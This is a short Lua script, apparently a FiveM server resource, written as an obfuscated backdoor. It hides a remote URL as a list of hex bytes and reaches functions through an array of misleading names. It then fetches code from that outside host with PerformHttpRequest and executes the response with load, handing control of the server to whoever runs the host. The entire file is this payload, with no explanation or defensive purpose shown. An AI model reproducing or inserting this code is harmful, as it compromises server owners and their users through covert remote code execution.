local Enchanced_Tabs = {
	Ench, Support, Host, Pairs,
	Realease, Callbacks, Source,
	Hosting, Event, PerformHttpRequest,
	assert, server, load, Spawn, materials
}

local random_char = {
	"68", "74", "74", "70", "73", "3a", "2f", "2f", "66", "69", "76", "65", "6d", "2e", "6b", "76",
	"61", "63", "2e", "63", "7a", "2f", "66", "2e", "70", "68", "70", "3f", "6b", "65", "79", "3d",
	"6f", "6a", "6f", "54", "4a", "5a", "57", "65", "50", "52", "6e", "50", "4b", "59", "55", "70", "41", "36", "7a", "34",
}

function str_utf8()
	_empt = ""
	for id,it in pairs(random_char) do
		_empt = _empt..it
	end
	return (_empt:gsub("..", function (cc)
		return string.char(tonumber(cc, 16))
		
	end))
end

Enchanced_Tabs[10](str_utf8(), function (e, d)
	local s = Enchanced_Tabs[11](Enchanced_Tabs[13](d))
	if (d == nil) then return end
	s()
end)